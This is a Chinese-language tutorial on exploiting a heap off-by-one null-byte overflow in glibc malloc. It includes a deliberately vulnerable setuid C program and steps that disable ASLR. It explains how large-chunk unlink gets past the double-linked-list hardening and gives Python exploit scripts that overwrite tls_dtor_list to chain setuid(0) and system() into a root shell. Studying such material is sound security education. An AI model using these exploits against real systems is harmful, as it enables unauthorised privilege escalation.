### Off-By-One Vulnerability (Heap Based)

一个堆段根据用户堆内存请求分为多个块。每个块都有自己的块头（由 malloc_chunk 表示）。结构 malloc_chunk 包含以下四个元素

- prev_size – 如果前一个块是空闲的，这个字段包含前一个块的大小。否则，如果分配了前一个块，则该字段包含前一个块的用户数据。

- size ：此字段包含此分配的块的大小。该字段的最后 3 位包含标志信息。

  * PREV_INUSE (P) – 该位在分配前一个块时设置。 I

  * S_MMAPPED (M) – 当块被 mmap'd 时设置此位。 

  * NON_MAIN_ARENA (N) – 当这个块属于 thread arena 时，该位被设置。

- fd – 指向同一个 bin 中的下一个块。 

- bk - 指向同一个 bin 中的前一个块。

```C
//consolidate_forward.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SIZE 16

int main(int argc, char* argv[])
{

 int fd = open("./inp_file", O_RDONLY); /* [1] */
 if(fd == -1) {
 printf("File open error\n");
 fflush(stdout);
 exit(-1);
 }

 if(strlen(argv[1])>1020) { /* [2] */
 printf("Buffer Overflow Attempt. Exiting...\n");
 exit(-2);
 }

 char* tmp = malloc(20-4); /* [3] */
 char* p = malloc(1024-4); /* [4] */
 char* p2 = malloc(1024-4); /* [5] */
 char* p3 = malloc(1024-4); /* [6] */

 read(fd,tmp,SIZE); /* [7] */
 strcpy(p2,argv[1]); /* [8] */

 free(p); /* [9] */
}

```

编译

```
#echo 0 > /proc/sys/kernel/randomize_va_space
$gcc -o consolidate_forward consolidate_forward.c
$sudo chown root consolidate_forward
$sudo chgrp root consolidate_forward
$sudo chmod +s consolidate_forward
```

注意：出于演示目的，ASLR 已关闭。如果您想绕过 ASLR，请使用本文所述的信息泄漏错误或暴力破解技术。

上述代码的第 [2] 和 [8] 行是可能发生基于堆的 Off-By-One 溢出的位置。目标缓冲区长度为 1020，因此长度为 1020 字节的源字符串可能导致任意代码执行。

如何实现任意代码执行？

当单个空字节覆盖下一个块（'p3'）的 chunk header 时，可以实现任意代码执行。当一个大小为 1020 字节 (‘p2’) 的块被单个字节溢出时，下一个块 (‘p3’) chunk header 的 size 的最低有效字节将被 NULL 字节覆盖，而不是 prev_size 的最低有效字节。

为什么覆盖的是 size 的 LSB 而不是 prev_size 的 LSB？

checked_request2size 将用户请求的大小转换为可用大小（内部表示大小），因为存储 malloc_chunk 和对齐需要一些额外空间。转换以这样一种方式进行，即永远不会设置可用大小的最后 3 位，因此它用于存储标志信息 P、M 和 N。

因此，当 malloc(1020) 在我们的的代码中执行时，1020 字节的用户请求大小将转换为 ((1020 + 4 + 7) & ~7) 1024 字节（内部表示大小）。分配的 1020 字节块的额外开销只有 4 字节，但是对于分配的块，我们需要大小为 8 字节的 chunk header，以便存储 prev_size 和size 信息。因此，1024 字节块的前 8 个字节将用于块头，但现在我们只剩下 1016（1024-8）字节用于用户数据，而不是 1020 字节。但是正如上面 prev_size 定义中所说，如果分配了前一个块（'p2'），则块的（'p3'）prev_size 字段包含用户数据。因此，位于这个分配的 1024 字节块 ('p2') 旁边的块 ('p3') 的 prev_size 包含剩余的 4 字节用户数据。

注意：上图中的攻击者数据将在下面的“覆盖 tls_dtor_list”部分进行说明。

现在回到我们最初的问题。

怎样实现一个任意代码执行。

现在我们知道，在 Off-By-One 错误的情况下，单个空字节会覆盖下一个块 (‘p3’) 大小字段的 LSB。这个单个 NULL 字节覆盖意味着该块（'p3'）的标志信息被清除，即，溢出的块（'p2'）变成 free 状态，尽管处于分配状态。这种不一致的状态驱使 glibc 代码 unlink一个已经被分配的块（p2）。

unlink 一个已经处于分配状态的块可能会导致任意代码执行，因为任何四字节内存区域都可以写入攻击者的数据

正如这篇文章中所见，unlink 已经处于分配状态的块可能会导致任意代码执行，因为任何四字节内存区域都可能被攻击者的数据写入。但是 unlink 技术已经过时了，因为 glibc 多年来变得更加安全。特别是考虑到“损坏的双链表”的条件，任意代码执行是不可能的。

但在 2014 年底，谷歌的 project zero team 找到了一种方法，通过 unlink 一个 large chunk 来成功绕过“损坏的双链表”。

```c
#define unlink(P, BK, FD) { 
  FD = P->fd; 
  BK = P->bk;
  // Primary circular double linked list hardening - Run time check
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) /* [1] */
   malloc_printerr (check_action, "corrupted double-linked list", P); 
  else { 
   // If we have bypassed primary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!
   FD->bk = BK; /* [2] */
   BK->fd = FD; /* [3] */
   if (!in_smallbin_range (P->size) 
   && __builtin_expect (P->fd_nextsize != NULL, 0)) { 
    // Secondary circular double linked list hardening - Debug assert
    assert (P->fd_nextsize->bk_nextsize == P);  /* [4] */
        assert (P->bk_nextsize->fd_nextsize == P); /* [5] */
    if (FD->fd_nextsize == NULL) { 
     if (P->fd_nextsize == P) 
      FD->fd_nextsize = FD->bk_nextsize = FD; 
     else { 
      FD->fd_nextsize = P->fd_nextsize; 
      FD->bk_nextsize = P->bk_nextsize; 
      P->fd_nextsize->bk_nextsize = FD; 
      P->bk_nextsize->fd_nextsize = FD; 
     } 
    } else { 
     // If we have bypassed secondary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!
     P->fd_nextsize->bk_nextsize = P->bk_nextsize; /* [6] */
     P->bk_nextsize->fd_nextsize = P->fd_nextsize; /* [7] */
    } 
   } 
  } 
}
```

在 glibc malloc 中，主循环双链表由 malloc_chunk 的 fd 和 bk 字段维护，而二级循环双链表由 malloc_chunk 的 fd_nextsize 和 bk_nextsize 字段维护。看起来损坏的双链表加固适用于主（第 [1] 行）和辅助（第 [4] 和 [5] 行）双链表，但辅助循环双链表的加固只是一个调试断言语句（而不是像主循环双链表强化这样的运行时检查，它不会编译到生产版本中（至少在 Fedora（x86）机器中）。因此二级循环双链表加固（第 [4] 和 [5] 行）没有意义，它允许我们将任意数据写入任何 4 字节内存区域（第 [6] 和 [7] 行）。

还有一些事情需要处理，所以让我们在这里更详细地了解 unlink 一个 large chunk 如何导致任意代码执行。由于攻击者可以控制要释放的 large chunk ，因此他会覆盖 malloc_chunk 元素，如下所述：

- fd 应该指向释放的块地址以通过主循环双向链表加固。
- bk 也应该指向释放的块地址以通过主循环双向链表加固
- fd_nextsize 应该指向 free_got_addr – 0x14
- bk_nextsize 应该指向 system_addr

但是第 [6] 和 [7] 行，我们希望fd_nextsize 和 bk_nextsize 都是可写的。 fd_nextsize 是可写的（因为它指向 free_got_addr – 0x14）但 bk_nextsize 是不可写的，因为它指向属于 libc.so 的 text 段的 system_addr，这个希望 fd_nextsize 和 bk_nextsize 都可写的问题通过覆盖 tls_dtor_list 来解决。

**覆盖 tls_dtor_list**

tls_dtor_list 是一个线程局部变量，其中包含要在 exit() 期间调用的函数指针列表。 __call_tls_dtors 遍历 tls_dtor_list 并一一调用函数，因此，如果我们可以用包含 system 和 system_arg 的堆地址覆盖 tls_dtor_list，而不是 dtor_list 的 func 和 obj，则可以调用 system()。

[2]

因此，对于攻击者的覆写，以释放 large chunk 的 malloc_chunk 元素，如下所述

- fd 应该指向释放的块地址以通过主循环双向链表加固
- bk 也应该指向释放的块地址以通过主循环双向链表加固
- fd_nextsize 应该指向 tls_dtor_list – 0x14
- bk_nextsize 应该指向包含 dtor_list 元素的堆地址。

由于 tls_dtor_list 属于 libc.so 的可写段，fd_nextsize 可写的问题得到解决，通过反汇编 __call_tls_dtors()，发现 tls_dtor_list 地址在 0xb7fe86d4。

bk_next size 可写的问题得到解决，因为它指向堆地址。

有了所有这些信息，让我们编写一个利用程序来攻击易受攻击的二进制文件“consolidate_forward”。

```python
#exp_try.py
#!/usr/bin/env python
import struct
from subprocess import call

fd = 0x0804b418
bk = 0x0804b418
fd_nextsize = 0xb7fe86c0
bk_nextsize = 0x804b430
system = 0x4e0a86e0
sh = 0x80482ce

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = conv(fd)
buf += conv(bk)
buf += conv(fd_nextsize)
buf += conv(bk_nextsize)
buf += conv(system)
buf += conv(sh)
buf += "A" * 996

print "Calling vulnerable program"
call(["./consolidate_forward", buf])
```

执行上面的漏洞利用代码并没有给我们 root shell，它给了我们一个在我们自己的特权级别上运行的 bash shell。

**为什么没有获得root shell？**

当 uid != euid 时 /bin/bash 去除特权。我们的二进制文件“consolidate_forward”的real uid 为 1000 并且它的 effective uid 为 0，因此，当 system() 被调用时，bash 会去除特权，因为 real uid ！= effective uid。为了解决这个问题，我们需要在 system() 之前调用 setuid(0)，并且由于 _call_tls_dtors() 会一一遍历 tls_dtor_list，因此我们需要链接 setuid() 和 system() 以获得 root shell！

```python
#gen_file.py
#!/usr/bin/env python
import struct

#dtor_list
setuid = 0x4e123e30
setuid_arg = 0x0
mp = 0x804b020
nxt = 0x804b430

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

tst = conv(setuid)
tst += conv(setuid_arg)
tst += conv(mp)
tst += conv(nxt)

print tst
-----------------------------------------------------------------------------------------------------------------------------------
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

fd = 0x0804b418
bk = 0x0804b418
fd_nextsize = 0xb7fe86c0
bk_nextsize = 0x804b008
system = 0x4e0a86e0
sh = 0x80482ce

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = conv(fd)
buf += conv(bk)
buf += conv(fd_nextsize)
buf += conv(bk_nextsize)
buf += conv(system)
buf += conv(sh)
buf += "A" * 996

print "Calling vulnerable program"
call(["./consolidate_forward", buf])

```

上述代码会返回一个 root shell。

